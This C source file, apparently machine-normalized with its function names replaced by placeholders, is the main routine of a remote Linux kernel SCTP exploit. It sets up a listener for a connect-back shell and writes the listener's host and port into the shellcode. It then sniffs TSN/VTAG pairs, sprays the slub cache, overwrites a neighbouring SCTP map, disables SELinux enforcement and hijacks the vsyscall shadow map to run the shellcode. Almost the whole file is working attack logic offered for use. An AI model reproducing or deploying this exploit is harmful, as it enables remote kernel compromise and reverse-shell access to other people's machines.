#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_10__   TYPE_5__ ;
typedef  struct TYPE_9__   TYPE_4__ ;
typedef  struct TYPE_8__   TYPE_3__ ;
typedef  struct TYPE_7__   TYPE_2__ ;
typedef  struct TYPE_6__   TYPE_1__ ;

/* Type definitions */
struct TYPE_6__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  o ;
typedef  int /*<<< orphan*/  l ;
typedef  int __u32 ;
typedef  int __u16 ;
struct TYPE_10__ {int nconn; int /*<<< orphan*/  rport; int /*<<< orphan*/  rhost; int /*<<< orphan*/  lport; int /*<<< orphan*/  lhost; } ;
struct TYPE_9__ {scalar_t__ allocator_type; int slubsize; int chunksize; int ptrsize; int scodesize; int vsysjumpsize; scalar_t__ vsysjump; scalar_t__ scode; scalar_t__ vsysaddr; scalar_t__ selinux; scalar_t__ hostoff; scalar_t__ portoff; } ;
struct TYPE_7__ {void* s_addr; } ;
struct TYPE_8__ {TYPE_2__ sin_addr; void* sin_port; void* sin_family; } ;

/* Variables and functions */
 int CLONE_VM ; 
 int /*<<< orphan*/  IPPROTO_SCTP ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 void* PF_INET ; 
 int SIGCHLD ; 
 scalar_t__ SLAB_ALLOCATOR ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  SOL_SOCKET ; 
 int /*<<< orphan*/  SO_REUSEADDR ; 
 scalar_t__ STACK_SIZE ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (char*,scalar_t__,scalar_t__,scalar_t__,scalar_t__) ; 
 scalar_t__ __zero ; 
 scalar_t__ FUNC4 (int,struct sockaddr*,int) ; 
 int FUNC5 (scalar_t__,int,int) ; 
 int FUNC6 (int /*<<< orphan*/ ,scalar_t__,int,int /*<<< orphan*/ *) ; 
 scalar_t__ clone_stack ; 
 int /*<<< orphan*/  clone_thread ; 
 int /*<<< orphan*/  FUNC7 () ; 
 TYPE_5__ h ; 
 void* FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ,int) ; 
 void* FUNC10 (int /*<<< orphan*/ ) ; 
 TYPE_4__* k ; 
 scalar_t__ FUNC11 (int,int) ; 
 int FUNC12 (int,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC13 (scalar_t__,int*,int) ; 
 int /*<<< orphan*/  FUNC14 (int) ; 
 scalar_t__ raw_sctp ; 
 int /*<<< orphan*/  FUNC15 (int,char**) ; 
 int /*<<< orphan*/  FUNC16 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int,scalar_t__,scalar_t__) ; 
 TYPE_3__ server_sctp ; 
 scalar_t__ FUNC17 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int) ; 
 int /*<<< orphan*/  FUNC18 (int) ; 
 void* FUNC19 (void*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int sport ; 
 int sport2 ; 
 int /*<<< orphan*/  streams ; 
 int /*<<< orphan*/  FUNC20 () ; 
 scalar_t__ tsn ; 
 scalar_t__ tsn2 ; 
 scalar_t__ vtag ; 
 scalar_t__ vtag2 ; 
 int /*<<< orphan*/  FUNC21 (int /*<<< orphan*/ *) ; 

int FUNC22(int argc, char **argv)
{

  int ret, fd, i, listenfd,o=1;
  struct sockaddr_in l;
  __u32 lh;
  __u16 lp;

  FUNC15(argc, argv);

  listenfd = FUNC19(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(FUNC17(listenfd, SOL_SOCKET, SO_REUSEADDR, (char *)&o, sizeof(o)) < 0)
   FUNC1("setsockopt: SO_REUSEADDR");
  
  l.sin_family = PF_INET;
  l.sin_port = FUNC8(h.lport); 
  l.sin_addr.s_addr = FUNC10(h.lhost);
  if(FUNC4(listenfd, (struct sockaddr *)&l, sizeof(l)) < 0)
    FUNC1("bind: sock");
  
  if(FUNC11(listenfd, 4) < 0)
    FUNC1("listen: sock");
  

  /* set connect back params */
  lh = FUNC10(h.lhost);
  lp = FUNC8(h.lport);
  FUNC13(k->scode + k->portoff, &lp, 2);
  FUNC13(k->scode + k->hostoff, &lh, 4);

  raw_sctp = FUNC19(PF_INET, SOCK_RAW, IPPROTO_SCTP);
  if(raw_sctp < 0)
    FUNC1("socket: RAW/SCTP montitor socket");
  
  server_sctp.sin_family = PF_INET;
  server_sctp.sin_port = FUNC8(h.rport); 
  server_sctp.sin_addr.s_addr = FUNC10(h.rhost);

  FUNC2("[**] Monitoring Network for TSN/VTAG pairs.. \n");
  ret = FUNC6(clone_thread, clone_stack+STACK_SIZE-8, CLONE_VM|SIGCHLD, NULL);
  if(ret < 0)
    FUNC1("clone");
  
  FUNC18(1);

  FUNC2("[**] Start flushing slub cache...\n");
  for(i=0; i<=h.nconn; i++)
  {
    __u16 p = sport-(h.nconn-1)+i;
    if(p == sport || p== sport2)
      fd = FUNC12(p, h.rport, 1);
    else 
      fd = FUNC12(sport-(h.nconn-1)+i, h.rport, 0);
//    usleep(10);
  } 


  FUNC7(); 
  /* wait for monitoring engine */ 
  FUNC21(NULL);

  if(k->allocator_type == SLAB_ALLOCATOR)
    FUNC20();
 
  if(vtag && tsn && vtag2 && tsn2)   
  {
    __u32 acc;
    
    FUNC3("[**] Using TSN/VTAG pairs: (TSN: %x <=> VTAG: %x) / (TSN: %x <=> VTAG: %x)...\n", tsn, vtag, tsn2, vtag2);
    FUNC18(1);

    if(k->selinux)
    {
      FUNC2("[**] Overwriting neightboard sctp map..\n");
      acc = (k->slubsize - k->chunksize) / 2;
      ret = FUNC5(k->selinux, k->ptrsize, acc); 
      if(ret < 0)
        FUNC0("Error Building Streams...");
    
      FUNC9(streams, ret);
      FUNC16(sport, h.rport, streams, ret, vtag, tsn); 

      FUNC2("[**] Disabling Selinux Enforcing Mode..\n");
      ret = FUNC5(__zero, 4, 0);
      if(ret < 0)
        FUNC0("Error Building Streams...");

      FUNC9(streams, ret);
      FUNC16(sport2, h.rport, streams, ret, vtag2, tsn2); 
    }

    FUNC2("[**] Overwriting neightboard sctp map ......\n");
    acc = (k->slubsize - k->chunksize) / 2;
    ret = FUNC5(k->vsysaddr, k->ptrsize, acc); 
    if(ret < 0)
      FUNC0("Error Building Streams...");

    FUNC9(streams, ret);
    FUNC16(sport, h.rport, streams, ret, vtag, tsn); 

    FUNC2("[**] Overwriting vsyscall shadow map..\n");
    acc = 0x930 / 2;
    ret = FUNC5(k->scode, k->scodesize, acc); //1176 
    if(ret < 0)
      FUNC0("Error Building Streams...");

    FUNC9(streams, ret);
    FUNC16(sport2, h.rport, streams, ret, vtag2, tsn2); 
     
    FUNC2("[**] Hijacking vsyscall shadow map..\n");
    ret = FUNC5(k->vsysjump, k->vsysjumpsize, 0); 
    if(ret < 0)
      FUNC0("Error Building Streams...");

    FUNC9(streams, ret);
    FUNC16(sport2, h.rport, streams, ret, vtag2, tsn2); 

    FUNC18(1); 
  }
  else
    FUNC0("VTAG/TSN not found: network error");


  FUNC14(listenfd); 
  FUNC2("[**] Closing Connection... \n");
  return 0;
}